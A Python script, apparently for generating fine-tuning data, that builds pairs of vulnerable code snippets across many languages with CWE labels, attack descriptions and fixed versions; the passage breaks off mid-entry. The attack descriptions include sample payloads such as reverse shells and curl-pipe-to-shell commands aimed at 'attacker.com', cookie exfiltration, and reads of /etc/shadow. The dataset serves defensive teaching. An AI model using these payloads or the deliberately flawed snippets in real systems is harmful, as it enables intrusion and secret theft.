"""고품질 학습 데이터 생성 v2 — 안전한 Q&A 포맷.

기존 VULN_TYPE: 포맷 제거, 명확한 instruction 포맷으로 전면 교체.
포맷:
  prompt:     "Analyze this {lang} code for security vulnerabilities:\n\n{code}"
  completion: "VULNERABILITY: CWE-XX Name\nSEVERITY: LEVEL\nATTACK: ...\nFIX:\n..."

실행:
  python scripts/generate_training_data_v2.py
  python scripts/generate_training_data_v2.py --output data/lora_train_v4.jsonl
"""

from __future__ import annotations

import argparse
import json
import random
import re
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parents[1]
ORIG_V2  = BASE_DIR / "data" / "lora_train_v2.jsonl"
OUT_DATA = BASE_DIR / "data" / "lora_train_v4.jsonl"


def prompt(lang: str, code: str) -> str:
    return f"Analyze this {lang} code for security vulnerabilities:\n\n{code}"


def completion(cwe: str, name: str, sev: str, attack: str, fix: str) -> str:
    return f"VULNERABILITY: {cwe} {name}\nSEVERITY: {sev}\nATTACK: {attack}\nFIX:\n{fix}"


def ex(lang, code, cwe, name, sev, attack, fix) -> dict:
    return {"prompt": prompt(lang, code), "completion": completion(cwe, name, sev, attack, fix)}


# ── 기존 VULN_TYPE: 포맷 변환 ─────────────────────────────────────────────────

def convert_old(records: list[dict]) -> list[dict]:
    """lora_train_v2.jsonl (VULN_TYPE: 포맷) → 새 포맷 변환."""
    converted = []
    for d in records:
        old_prompt = d["prompt"]
        comp = d["completion"]
        # 프롬프트에서 "VULN_TYPE:" 제거
        new_prompt = re.sub(r"\n\nVULN_TYPE:\s*$", "", old_prompt).strip()
        # completion이 "CWE-XX Name\nSEVERITY:..." 형식 → 새 포맷으로 재조합
        lines = comp.strip().splitlines()
        if not lines:
            continue
        first_line = lines[0].strip()
        cwe_m = re.match(r"(CWE-\d+)\s*(.*)", first_line)
        if cwe_m:
            cwe, rest_name = cwe_m.group(1), cwe_m.group(2).strip()
            new_comp = f"VULNERABILITY: {cwe} {rest_name}\n" + "\n".join(lines[1:])
        else:
            new_comp = f"VULNERABILITY: {first_line}\n" + "\n".join(lines[1:])
        converted.append({"prompt": new_prompt, "completion": new_comp})
    return converted


# ── 신규 데이터 풀 ─────────────────────────────────────────────────────────────

EXAMPLES: list[dict] = [

    # ══ SQL Injection ══════════════════════════════════════════════════════════
    ex("Python",
       'cursor.execute("SELECT * FROM users WHERE email=\'" + email + "\'")',
       "CWE-89","SQL Injection","HIGH",
       "Attacker passes email=' OR '1'='1'-- to bypass authentication.",
       'cursor.execute("SELECT * FROM users WHERE email=%s", (email,))'),

    ex("Python",
       'query = "UPDATE accounts SET balance=" + amount + " WHERE user_id=" + uid\ndb.execute(query)',
       "CWE-89","SQL Injection","CRITICAL",
       "Attacker injects into amount to set any balance or delete records.",
       'db.execute("UPDATE accounts SET balance=%s WHERE user_id=%s", (amount, uid))'),

    ex("Python",
       'results = db.execute(f"SELECT * FROM products WHERE category=\'{cat}\' ORDER BY {sort_col}")',
       "CWE-89","SQL Injection via ORDER BY","HIGH",
       "ORDER BY clause allows column name injection, enabling data extraction via error messages.",
       'ALLOWED_COLS = {"name", "price", "created_at"}\nif sort_col not in ALLOWED_COLS: sort_col = "name"\nresults = db.execute("SELECT * FROM products WHERE category=%s ORDER BY " + sort_col, (cat,))'),

    ex("Node.js",
       "const rows = await db.all(`SELECT * FROM notes WHERE owner='${user}' AND id=${id}`)",
       "CWE-89","SQL Injection","HIGH",
       "Template literal allows injection through both user and id parameters.",
       "const rows = await db.all('SELECT * FROM notes WHERE owner=? AND id=?', [user, id])"),

    ex("Java",
       'String q = "SELECT * FROM customers WHERE name LIKE \'%" + name + "%\'";\nResultSet rs = stmt.executeQuery(q);',
       "CWE-89","SQL Injection","HIGH",
       "LIKE query allows injection with name=x%' UNION SELECT * FROM credentials--.",
       'PreparedStatement ps = conn.prepareStatement("SELECT * FROM customers WHERE name LIKE ?");\nps.setString(1, "%" + name + "%");\nResultSet rs = ps.executeQuery();'),

    ex("PHP",
       '$user = mysql_fetch_assoc(mysql_query("SELECT * FROM users WHERE id=".$_GET["id"]));',
       "CWE-89","SQL Injection (mysql_query)","CRITICAL",
       "Deprecated mysql_query with no escaping allows full database access.",
       '$stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");\n$stmt->execute([$_GET["id"]]);\n$user = $stmt->fetch();'),

    ex("Ruby",
       'User.where("username = \'#{params[:username]}\' AND password = \'#{params[:password]}\'")',
       "CWE-89","SQL Injection (ActiveRecord)","CRITICAL",
       "String interpolation in where() bypasses authentication with ' OR 1=1--.",
       'User.where(username: params[:username], password: params[:password])'),

    ex("Go",
       'rows, _ := db.Query("SELECT * FROM files WHERE owner=" + userID + " AND name=\'" + filename + "\'")',
       "CWE-89","SQL Injection","HIGH",
       "Both userID and filename are injectable, allowing cross-user file access.",
       'rows, _ := db.Query("SELECT * FROM files WHERE owner=$1 AND name=$2", userID, filename)'),

    ex("TypeScript/Next.js",
       'const data = await prisma.$queryRawUnsafe(`SELECT * FROM Post WHERE slug = "${slug}"`)',
       "CWE-89","SQL Injection via $queryRawUnsafe","HIGH",
       "Attacker injects into slug to extract all posts or admin credentials.",
       'const data = await prisma.post.findUnique({ where: { slug } })'),

    ex("Kotlin",
       'val cursor = db.rawQuery("SELECT * FROM messages WHERE recipient=\'${userId}\'", null)',
       "CWE-89","SQL Injection (Android SQLite)","HIGH",
       "Attacker crafts userId to access messages of all users.",
       'val cursor = db.rawQuery("SELECT * FROM messages WHERE recipient=?", arrayOf(userId))'),

    # ══ Command Injection ══════════════════════════════════════════════════════
    ex("Python",
       'os.system(f"unzip {zip_path} -d {extract_dir}")',
       "CWE-78","OS Command Injection","CRITICAL",
       "Attacker sets zip_path='evil.zip -d /tmp; curl attacker.com|sh' to execute code.",
       'subprocess.run(["unzip", zip_path, "-d", extract_dir], check=True)'),

    ex("Python",
       'output = subprocess.getoutput("nmap -p " + ports + " " + target)',
       "CWE-78","OS Command Injection","CRITICAL",
       "Injecting ports='80; cat /etc/shadow' allows reading sensitive files.",
       'output = subprocess.check_output(["nmap", "-p", ports, target], text=True)'),

    ex("Python",
       'os.popen(f"convert {input_file} -resize {size} {output_file}")',
       "CWE-78","OS Command Injection via ImageMagick","CRITICAL",
       "Attacker sets size='100x100\\`id > /tmp/pwned\\`' to execute arbitrary commands.",
       'subprocess.run(["convert", input_file, "-resize", size, output_file])'),

    ex("Node.js",
       'child_process.exec(`git log --oneline ${branch}`, (err, out) => res.send(out))',
       "CWE-78","OS Command Injection","CRITICAL",
       "Attacker sets branch='main && cat /etc/passwd' to exfiltrate server data.",
       'const safe = branch.replace(/[^a-zA-Z0-9/_-]/g, "");\nchild_process.execFile("git", ["log", "--oneline", safe], (err, out) => res.send(out))'),

    ex("Node.js",
       'exec("ffmpeg -i " + inputPath + " -vf scale=640:480 " + outputPath)',
       "CWE-78","OS Command Injection","CRITICAL",
       "Attacker controls inputPath to inject shell commands via FFmpeg call.",
       'execFile("ffmpeg", ["-i", inputPath, "-vf", "scale=640:480", outputPath])'),

    ex("Java",
       'String[] cmd = {"/bin/sh", "-c", "ls " + userDir};\nRuntime.getRuntime().exec(cmd);',
       "CWE-78","OS Command Injection via -c flag","CRITICAL",
       "Shell -c flag interprets userDir as shell script; attacker injects ; rm -rf /.",
       'ProcessBuilder pb = new ProcessBuilder("ls", userDir);\npb.start();'),

    ex("PHP",
       '$out = exec("convert uploads/" . $_FILES["img"]["name"] . " thumb.jpg");',
       "CWE-78","OS Command Injection via Filename","CRITICAL",
       "Attacker uploads file named 'x; nc attacker.com 4444 -e /bin/sh' to get shell.",
       '$name = basename($_FILES["img"]["name"]);\n$name = preg_replace("/[^a-zA-Z0-9._-]/", "", $name);\n$out = exec("convert uploads/" . escapeshellarg($name) . " thumb.jpg");'),

    ex("Ruby",
       'IO.popen("grep #{params[:term]} /var/log/app.log")',
       "CWE-78","OS Command Injection","CRITICAL",
       "Attacker injects shell metacharacters via term parameter to read arbitrary files.",
       'IO.popen(["grep", params[:term], "/var/log/app.log"])'),

    ex("Shell",
       '#!/bin/bash\nfilename=$1\ncat /var/data/$filename',
       "CWE-78","Shell Injection / Path Traversal","HIGH",
       "Attacker passes '../../../etc/passwd' as $1 to read sensitive system files.",
       '#!/bin/bash\nfilename=$(basename "$1")\ncat "/var/data/$filename"'),

    ex("Go",
       'out, _ := exec.Command("sh", "-c", fmt.Sprintf("dig %s", domain)).Output()',
       "CWE-78","OS Command Injection","CRITICAL",
       "Shell -c interprets domain value; attacker injects '; id' after domain.",
       'out, _ := exec.Command("dig", domain).Output()'),

    # ══ XSS ═══════════════════════════════════════════════════════════════════
    ex("JavaScript/React",
       'return <a href={`javascript:${action}`}>Click</a>',
       "CWE-79","XSS via javascript: URI","HIGH",
       "Attacker sets action='alert(document.cookie)' to steal session cookies.",
       '// Block javascript: scheme\nif (action.startsWith("javascript:")) return null;\nreturn <a href={action}>Click</a>'),

    ex("JavaScript/React",
       "eval(new URLSearchParams(window.location.search).get('cb'))",
       "CWE-79","DOM-based XSS via eval","CRITICAL",
       "Attacker crafts URL with cb=fetch('//evil?c='+document.cookie) to exfiltrate cookies.",
       "// Never eval URL parameters. Use JSON.parse or specific parsers."),

    ex("Node.js",
       'res.send(`<title>${req.headers["x-app-name"]}</title>`)',
       "CWE-79","Reflected XSS via Request Header","HIGH",
       "Attacker sends X-App-Name: </title><script>evil()</script> header to inject script.",
       'const name = (req.headers["x-app-name"] || "").replace(/[<>\"\']/g, "");\nres.send(`<title>${name}</title>`)'),

    ex("PHP",
       '<?php echo "Welcome back, " . $_SESSION["username"]; ?>',
       "CWE-79","Stored XSS from Session Data","HIGH",
       "If session data is user-controlled, stored XSS payload executes on every page load.",
       '<?php echo "Welcome back, " . htmlspecialchars($_SESSION["username"], ENT_QUOTES, "UTF-8"); ?>'),

    ex("Python",
       'return jsonify({"error": f"Invalid value: {user_value}"})',
       "CWE-79","XSS in JSON Error Response","MEDIUM",
       "If response is rendered as HTML, attacker injects <script> via user_value.",
       '# jsonify auto-escapes; ensure Content-Type is application/json and not rendered as HTML\nreturn jsonify({"error": "Invalid value: " + str(user_value)[:100]})'),

    ex("Java Spring Boot",
       '@RequestMapping("/error")\npublic String error(@RequestParam String msg) {\n    return "<h1>" + msg + "</h1>";\n}',
       "CWE-79","Reflected XSS in Error Page","HIGH",
       "Attacker crafts URL with msg=<script>document.location='//evil?'+document.cookie</script>.",
       '@RequestMapping("/error")\npublic String error(@RequestParam String msg, Model model) {\n    model.addAttribute("msg", msg);\n    return "error"; // use Thymeleaf th:text (auto-escaped)\n}'),

    ex("TypeScript/Next.js",
       'export default function Page({ searchParams }) {\n  return <div>{searchParams.q}</div>\n}',
       "CWE-79","XSS via Unescaped Search Params","HIGH",
       "Attacker injects HTML via q parameter if rendered without escaping.",
       'export default function Page({ searchParams }) {\n  return <div>{String(searchParams.q ?? "")}</div>  // React auto-escapes text nodes\n}'),

    # ══ Path Traversal ═════════════════════════════════════════════════════════
    ex("Python",
       'filename = request.args.get("file")\nreturn send_file(f"reports/{filename}")',
       "CWE-22","Path Traversal","HIGH",
       "Attacker requests ?file=../../etc/passwd to download arbitrary server files.",
       'import os\nbase = os.path.realpath("reports")\nfull = os.path.realpath(os.path.join(base, request.args.get("file","")))\nif not full.startswith(base): abort(404)\nreturn send_file(full)'),

    ex("Node.js",
       'app.get("/static", (req, res) => {\n  const file = req.query.name;\n  res.sendFile(path.join(__dirname, "assets", file));\n})',
       "CWE-22","Path Traversal in Static File Serving","HIGH",
       "Attacker requests name=../../server.js to read application source.",
       'const file = path.basename(req.query.name);\nconst full = path.join(__dirname, "assets", file);\nif (!full.startsWith(path.join(__dirname, "assets"))) return res.status(403).end();\nres.sendFile(full)'),

    ex("Java",
       'String content = new String(Files.readAllBytes(Paths.get("data/" + userInput)));',
       "CWE-22","Path Traversal","HIGH",
       "Attacker passes '../WEB-INF/web.xml' to read sensitive configuration.",
       'Path base = Paths.get("data").toRealPath();\nPath target = base.resolve(userInput).normalize();\nif (!target.startsWith(base)) throw new SecurityException("Path traversal detected");\nString content = Files.readString(target);'),

    ex("PHP",
       '$page = $_GET["page"];\ninclude("pages/" . $page . ".php");',
       "CWE-22","Local File Inclusion (LFI)","CRITICAL",
       "Attacker requests page=../../etc/passwd%00 to include arbitrary files or execute code.",
       '$page = basename(preg_replace("/[^a-zA-Z0-9_-]/", "", $_GET["page"]));\nif (!file_exists("pages/" . $page . ".php")) die("Not found");\ninclude("pages/" . $page . ".php");'),

    ex("Go",
       'content, _ := os.ReadFile("./templates/" + r.FormValue("tmpl") + ".html")',
       "CWE-22","Path Traversal","HIGH",
       "Attacker sets tmpl='../../etc/passwd' to read arbitrary files.",
       'name := filepath.Base(r.FormValue("tmpl"))\nfull := filepath.Join("./templates", name+".html")\ncontent, _ := os.ReadFile(full)'),

    # ══ Deserialization ════════════════════════════════════════════════════════
    ex("Python",
       'import pickle, base64\nobj = pickle.loads(base64.b64decode(request.cookies["cart"]))',
       "CWE-502","Insecure Deserialization from Cookie","CRITICAL",
       "Attacker crafts malicious pickle in cookie to execute arbitrary code on server.",
       'import json, base64\nobj = json.loads(base64.b64decode(request.cookies["cart"]))'),

    ex("Python",
       'import shelve\nwith shelve.open("user_data") as db:\n    obj = db[user_key]',
       "CWE-502","Insecure Deserialization (shelve/pickle)","CRITICAL",
       "If user_key is attacker-controlled and shelve data is tampered, RCE via pickle is possible.",
       '# Use SQLite or a proper database instead of shelve for user-controlled keys'),

    ex("Java",
       'ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());\nData d = (Data) ois.readObject();',
       "CWE-502","Java Native Deserialization","CRITICAL",
       "Attacker sends crafted gadget chain (ysoserial payload) to achieve unauthenticated RCE.",
       '// Replace with JSON: ObjectMapper om = new ObjectMapper(); Data d = om.readValue(socket.getInputStream(), Data.class);'),

    ex("PHP",
       '$prefs = unserialize(base64_decode($_GET["prefs"]));',
       "CWE-502","PHP Object Injection","CRITICAL",
       "Attacker crafts serialized object with __destruct that writes PHP webshell.",
       '$prefs = json_decode(base64_decode($_GET["prefs"]), true);'),

    ex("Ruby",
       'obj = Marshal.load(Base64.decode64(params[:data]))',
       "CWE-502","Ruby Marshal Deserialization","CRITICAL",
       "Ruby Marshal can instantiate arbitrary objects; attacker achieves RCE via gadget chain.",
       'obj = JSON.parse(Base64.decode64(params[:data]))'),

    ex("Node.js",
       'const obj = require("node-serialize").unserialize(req.body.data)',
       "CWE-502","Node.js IIFE Deserialization (node-serialize)","CRITICAL",
       "node-serialize executes IIFE functions embedded in serialized data, enabling RCE.",
       'const obj = JSON.parse(req.body.data)'),

    # ══ Hardcoded Secrets ══════════════════════════════════════════════════════
    ex("Python",
       'SENDGRID_API_KEY = "SG.xxxxxxxxxxxxxxxxxxxxxxxx"\nsg = sendgrid.SendGridAPIClient(SENDGRID_API_KEY)',
       "CWE-798","Hardcoded SendGrid API Key","HIGH",
       "API key in source allows attacker to send phishing emails or exceed quota.",
       'import os\nsg = sendgrid.SendGridAPIClient(os.environ["SENDGRID_API_KEY"])'),

    ex("Java",
       'String secretKey = "mySuperSecretKey1234";\nKey key = Keys.hmacShaKeyFor(secretKey.getBytes());',
       "CWE-798","Hardcoded JWT Signing Key","HIGH",
       "Attacker extracts key from binary/source to forge valid JWT tokens.",
       'String secretKey = System.getenv("JWT_SECRET");\nif (secretKey == null) throw new IllegalStateException();\nKey key = Keys.hmacShaKeyFor(secretKey.getBytes(StandardCharsets.UTF_8));'),

    ex("Node.js",
       "const stripe = require('stripe')('STRIPE_KEY_PLACEHOLDER')",
       "CWE-798","Hardcoded Payment API Key","CRITICAL",
       "Live Stripe key in source enables attacker to process fraudulent charges.",
       "const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY)"),

    ex("Go",
       'var dbDSN = "postgres://admin:password123@db:5432/prod"',
       "CWE-798","Hardcoded Database Credentials","CRITICAL",
       "Database credentials in source allow direct database access if repo is compromised.",
       'var dbDSN = os.Getenv("DATABASE_URL")'),

    ex("Python",
       'GOOGLE_OAUTH_SECRET = "GOCSPX-xxxxxxxxxxxxxxxxxxxxxxxxxx"',
       "CWE-798","Hardcoded OAuth Client Secret","HIGH",
       "OAuth secret exposed allows attacker to impersonate the application in authentication flows.",
       'GOOGLE_OAUTH_SECRET = os.environ["GOOGLE_OAUTH_SECRET"]'),

    ex("TypeScript/Next.js",
       'const NEXTAUTH_SECRET = "my-next-auth-secret-key"',
       "CWE-798","Hardcoded NextAuth Secret","HIGH",
       "Attacker forges session tokens to impersonate any user including admins.",
       'const NEXTAUTH_SECRET = process.env.NEXTAUTH_SECRET // set in .env.local, never commit'),

    # ══ Cryptographic Issues ══════════════════════════════════════════════════
    ex("Python",
       'import hashlib\nhashed = hashlib.sha256(password).hexdigest()',
       "CWE-916","Unsalted Password Hash","HIGH",
       "Identical passwords produce identical hashes; rainbow table attacks succeed.",
       'import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))'),

    ex("Python",
       'from Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_CBC, iv=b"0000000000000000")',
       "CWE-329","Static/Predictable IV in AES-CBC","HIGH",
       "Fixed IV causes identical plaintexts to produce identical ciphertext, leaking information.",
       'from Crypto.Cipher import AES\nimport os\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_GCM)'),

    ex("Node.js",
       "const token = Math.random().toString(36).substring(2)",
       "CWE-338","Weak PRNG for Security Token","HIGH",
       "Math.random() is not cryptographically secure; attacker predicts token values.",
       "const token = require('crypto').randomBytes(32).toString('hex')"),

    ex("Java",
       'Random rand = new Random();\nString token = Long.toHexString(rand.nextLong());',
       "CWE-338","Predictable Token using java.util.Random","HIGH",
       "java.util.Random is seeded with system time; attacker predicts future tokens.",
       'SecureRandom sr = new SecureRandom();\nbyte[] bytes = new byte[32];\nsr.nextBytes(bytes);\nString token = Base64.getUrlEncoder().encodeToString(bytes);'),

    ex("Python",
       'import requests\nrequests.get(url, verify=False)',
       "CWE-295","Disabled SSL Certificate Verification","HIGH",
       "verify=False allows MITM attacks; attacker intercepts encrypted communications.",
       'requests.get(url)  # verify=True by default, never disable in production'),

    ex("Node.js",
       "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'",
       "CWE-295","Disabled TLS Certificate Validation","HIGH",
       "Setting this flag globally disables all certificate checks, enabling MITM attacks.",
       "// Remove this line; if you need self-signed certs use: https.globalAgent.options.ca = fs.readFileSync('ca.pem')"),

    # ══ Authentication & Authorization ════════════════════════════════════════
    ex("Python",
       '@app.route("/api/users")\ndef list_users():\n    return jsonify([u.to_dict() for u in User.query.all()])',
       "CWE-284","Unauthenticated Sensitive Data Exposure","HIGH",
       "Any internet user can enumerate all users and their data without authentication.",
       '@app.route("/api/users")\n@login_required\n@roles_required("admin")\ndef list_users():\n    return jsonify([u.to_dict() for u in User.query.all()])'),

    ex("Node.js",
       'app.put("/posts/:id", async (req, res) => {\n    await Post.update(req.params.id, req.body);\n    res.json({ ok: true });\n})',
       "CWE-639","Insecure Direct Object Reference","HIGH",
       "Any authenticated user can modify any post by changing the ID in the URL.",
       'app.put("/posts/:id", authenticate, async (req, res) => {\n    const post = await Post.findById(req.params.id);\n    if (post.authorId !== req.user.id) return res.status(403).end();\n    await post.update(req.body);\n    res.json({ ok: true });\n})'),

    ex("Java Spring Boot",
       '@DeleteMapping("/comments/{id}")\npublic void delete(@PathVariable Long id) {\n    commentRepo.deleteById(id);\n}',
       "CWE-284","Missing Authorization on Delete","HIGH",
       "Any authenticated user can delete any other user's comments by guessing IDs.",
       '@DeleteMapping("/comments/{id}")\n@PreAuthorize("isAuthenticated()")\npublic void delete(@PathVariable Long id, @AuthenticationPrincipal UserDetails user) {\n    Comment c = commentRepo.findById(id).orElseThrow();\n    if (!c.getAuthor().equals(user.getUsername())) throw new ResponseStatusException(HttpStatus.FORBIDDEN);\n    commentRepo.deleteById(id);\n}'),

    ex("Python",
       'def reset_password(email, new_password):\n    user = User.query.filter_by(email=email).first()\n    user.password = new_password',
       "CWE-256","Plaintext Password Storage","CRITICAL",
       "Passwords stored in plaintext; any DB breach exposes all user credentials.",
       'def reset_password(email, new_password):\n    user = User.query.filter_by(email=email).first()\n    user.password_hash = bcrypt.generate_password_hash(new_password).decode("utf-8")\n    db.session.commit()'),

    ex("Python",
       'if request.form["token"] == user.reset_token:\n    allow_reset()',
       "CWE-208","Timing Attack on Reset Token","MEDIUM",
       "Non-constant-time comparison allows timing oracle to brute-force token character by character.",
       'import hmac\nif hmac.compare_digest(request.form["token"], user.reset_token):\n    allow_reset()'),

    ex("Node.js",
       "const isValid = req.body.token === process.env.ADMIN_TOKEN",
       "CWE-208","Timing Attack on Admin Token","MEDIUM",
       "JavaScript === comparison leaks timing; attacker enumerates valid characters.",
       "const crypto = require('crypto');\nconst isValid = crypto.timingSafeEqual(Buffer.from(req.body.token), Buffer.from(process.env.ADMIN_TOKEN))"),

    # ══ SSRF ══════════════════════════════════════════════════════════════════
    ex("Python",
       'target = request.json.get("target_url")\nresult = requests.get(target, timeout=10)',
       "CWE-918","Server-Side Request Forgery (SSRF)","HIGH",
       "Attacker requests http://169.254.169.254/latest/meta-data/ to steal AWS IAM credentials.",
       'from ipaddress import ip_address\nfrom urllib.parse import urlparse\nu = urlparse(request.json.get("target_url",""))\nif u.hostname in ("localhost","169.254.169.254") or ip_address(u.hostname).is_private:\n    abort(403)\nresult = requests.get(u.geturl(), timeout=5, allow_redirects=False)'),

    ex("Node.js",
       'const { url } = req.body;\nconst data = await fetch(url).then(r => r.text());',
       "CWE-918","SSRF via fetch","HIGH",
       "Attacker sends internal URL http://internal-admin:8080/secrets to read internal services.",
       'const { hostname } = new URL(url);\nconst { address } = await dns.promises.lookup(hostname);\nif (["127.0.0.1","::1","169.254.169.254"].includes(address)) return res.status(400).end();\nconst data = await fetch(url, { redirect: "error" }).then(r => r.text());'),

    ex("Java",
       'URL url = new URL(userInput);\nURLConnection conn = url.openConnection();\nreturn conn.getInputStream();',
       "CWE-918","SSRF via URL.openConnection()","HIGH",
       "Attacker targets file:// or internal http:// URLs to read local files or internal services.",
       'URL url = new URL(userInput);\nif (!url.getProtocol().equals("https")) throw new SecurityException("Only HTTPS allowed");\nInetAddress addr = InetAddress.getByName(url.getHost());\nif (addr.isLoopbackAddress() || addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) throw new SecurityException();\nreturn url.openConnection().getInputStream();'),

    # ══ CSRF ══════════════════════════════════════════════════════════════════
    ex("Python",
       '@app.route("/change-email", methods=["POST"])\n@login_required\ndef change_email():\n    current_user.email = request.form["email"]',
       "CWE-352","CSRF — Email Change","HIGH",
       "Attacker's site submits hidden form to /change-email, taking over victim's account.",
       '@app.route("/change-email", methods=["POST"])\n@login_required\ndef change_email():\n    token = request.form.get("csrf_token")\n    if not verify_csrf_token(token):\n        abort(403)\n    current_user.email = request.form["email"]'),

    ex("Node.js",
       'app.post("/logout-all", authenticate, async (req, res) => {\n    await Session.deleteMany({ userId: req.user.id });\n});',
       "CWE-352","CSRF — Session Invalidation","MEDIUM",
       "Attacker tricks victim into visiting page that posts to /logout-all, forcing logout.",
       '// Add csurf middleware or check Origin/Referer header\napp.post("/logout-all", authenticate, csrfProtection, async (req, res) => {\n    await Session.deleteMany({ userId: req.user.id });\n});'),

    # ══ Memory Safety (C/C++) ══════════════════════════════════════════════════
    ex("C",
       'char dest[100];\nstrncat(dest, src, strlen(src));',
       "CWE-121","Off-By-One Buffer Overflow via strncat","HIGH",
       "strncat's third arg should be remaining space, not src length; overflows if dest is full.",
       'char dest[100] = "";\nstrncat(dest, src, sizeof(dest) - strlen(dest) - 1);'),

    ex("C",
       'int *arr = malloc(n * sizeof(int));\n// ... use arr ...\nfree(arr);\nfree(arr);',
       "CWE-415","Double Free","CRITICAL",
       "Double free corrupts heap metadata; attacker leverages for arbitrary code execution.",
       'int *arr = malloc(n * sizeof(int));\n// ... use arr ...\nfree(arr);\narr = NULL;'),

    ex("C",
       'size_t len = strlen(input);\nchar *buf = malloc(len);\nstrcpy(buf, input);',
       "CWE-193","Off-by-One in malloc (no null terminator)","HIGH",
       "malloc(len) doesn't allocate space for null terminator; strcpy writes one byte beyond buffer.",
       'size_t len = strlen(input);\nchar *buf = malloc(len + 1);\nstrcpy(buf, input);'),

    ex("C++",
       'std::vector<int> v = {1,2,3};\nint x = v[10];',
       "CWE-125","Out-of-Bounds Vector Access","HIGH",
       "No bounds checking; undefined behavior allows reading adjacent heap memory.",
       'std::vector<int> v = {1,2,3};\nint x = v.at(10);  // throws std::out_of_range'),

    ex("C",
       'char buf[10];\nread(fd, buf, 256);',
       "CWE-121","Buffer Overflow via read()","CRITICAL",
       "Reading 256 bytes into a 10-byte buffer overwrites adjacent stack/heap memory.",
       'char buf[256];\nread(fd, buf, sizeof(buf));'),

    # ══ Open Redirect / OAuth ══════════════════════════════════════════════════
    ex("Python",
       'redirect_uri = request.args.get("next", "/")\nreturn redirect(redirect_uri)',
       "CWE-601","Open Redirect","MEDIUM",
       "Attacker sets next=https://phishing.com after /login to redirect victims.",
       'from urllib.parse import urlparse\nnext_url = request.args.get("next", "/")\nif urlparse(next_url).netloc:\n    next_url = "/"\nreturn redirect(next_url)'),

    ex("Node.js",
       'const { redirectTo } = req.session;\nres.redirect(redirectTo || "/dashboard");',
       "CWE-601","Open Redirect via Session","MEDIUM",
       "If redirectTo is set from user input without validation, attacker redirects to phishing site.",
       'const url = req.session.redirectTo || "/dashboard";\nconst safe = url.startsWith("/") ? url : "/dashboard";\nres.redirect(safe)'),

    # ══ XXE ═══════════════════════════════════════════════════════════════════
    ex("Java",
       'SAXParser parser = SAXParserFactory.newInstance().newSAXParser();\nparser.parse(userXml, handler);',
       "CWE-611","XML External Entity (XXE)","HIGH",
       "Default SAX parser resolves external entities; attacker embeds file:///etc/passwd reference.",
       'SAXParserFactory spf = SAXParserFactory.newInstance();\nspf.setFeature("http://xml.org/sax/features/external-general-entities", false);\nspf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\nSAXParser parser = spf.newSAXParser();\nparser.parse(userXml, handler);'),

    ex("Python",
       'from xml.etree import ElementTree as ET\ntree = ET.parse(user_xml_file)',
       "CWE-611","XXE via xml.etree","MEDIUM",
       "Python's ElementTree doesn't resolve external entities by default, but defusedxml is safer.",
       'import defusedxml.ElementTree as ET\ntree = ET.parse(user_xml_file)  # defusedxml blocks XXE/billion laughs'),

    # ══ Log Injection ═════════════════════════════════════════════════════════
    ex("Python",
       'app.logger.info("Password changed for: %s" % username)',
       "CWE-117","Log Injection","LOW",
       "Attacker inserts newlines in username to inject fake log entries and confuse SIEM.",
       'safe = username.replace("\\n","\\\\n").replace("\\r","\\\\r")\napp.logger.info("Password changed for: %s", safe)'),

    ex("Java",
       'logger.info("Login attempt for user: " + username);',
       "CWE-117","Log Injection","LOW",
       "Attacker sets username='admin\\nINFO: Login successful for root' to forge log entries.",
       'String safe = username.replaceAll("[\\r\\n]", "_");\nlogger.info("Login attempt for user: {}", safe);'),

    # ══ Supply Chain / Dependency ══════════════════════════════════════════════
    ex("Python",
       'import requests\nexec(requests.get("https://raw.githubusercontent.com/user/repo/main/setup.py").text)',
       "CWE-829","Remote Code Execution from Untrusted Source","CRITICAL",
       "If the GitHub repo is compromised, attacker executes arbitrary code on all installs.",
       '# Never exec() remote code. Use pip with pinned versions and hash verification:\n# pip install package==1.2.3 --require-hashes'),

    ex("Node.js",
       'npm install $(cat requirements.txt)',
       "CWE-78","Command Injection in Install Script","CRITICAL",
       "If requirements.txt is compromised, attacker injects shell commands into npm install.",
       '# Use package.json dependencies with lock file (package-lock.json) and npm ci'),

    # ══ GitHub Actions ════════════════════════════════════════════════════════
    ex("GitHub Actions",
       'on:\n  pull_request_target:\n    types: [opened]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}',
       "CWE-913","Unsafe pull_request_target with Head Checkout","HIGH",
       "pull_request_target has repo secrets; checking out PR head allows malicious code access to secrets.",
       '# For pull_request_target, never checkout PR head code that runs in privileged context\n# Use pull_request (no secrets) for untrusted PR code, or add approval gate'),

    ex("GitHub Actions",
       '- name: Create Release\n  run: |\n    VERSION=${{ github.event.inputs.version }}\n    echo "Releasing $VERSION"',
       "CWE-77","Expression Injection via workflow_dispatch Input","HIGH",
       "Attacker provides version='1.0; curl attacker.com/steal?t=$SECRET' to exfiltrate secrets.",
       '- name: Create Release\n  env:\n    VERSION: ${{ github.event.inputs.version }}\n  run: echo "Releasing $VERSION"'),

    # ══ IaC / Terraform ═══════════════════════════════════════════════════════
    ex("Terraform",
       'resource "aws_iam_user_policy" "admin" {\n  policy = jsonencode({\n    Statement = [{ Action = "*", Effect = "Allow", Resource = "*" }]\n  })\n}',
       "CWE-732","Overly Permissive IAM Policy (Wildcard)","HIGH",
       "Action=* grants all AWS actions; compromised credentials allow full account takeover.",
       'resource "aws_iam_user_policy" "limited" {\n  policy = jsonencode({\n    Statement = [{ Action = ["s3:GetObject","s3:PutObject"], Effect = "Allow", Resource = "arn:aws:s3:::my-bucket/*" }]\n  })\n}'),

    ex("Terraform",
       'resource "aws_db_instance" "main" {\n  publicly_accessible = true\n  username            = "admin"\n  password            = "password123"\n}',
       "CWE-668","Publicly Accessible RDS with Weak Credentials","CRITICAL",
       "Public DB with weak password exposed to internet; attacker gains full database access.",
       'resource "aws_db_instance" "main" {\n  publicly_accessible = false\n  username            = var.db_user\n  password            = var.db_password  # use secrets manager\n  vpc_security_group_ids = [aws_security_group.db.id]\n}'),

    # ══ Mobile (Kotlin/Swift) ══════════════════════════════════════════════════
    ex("Kotlin",
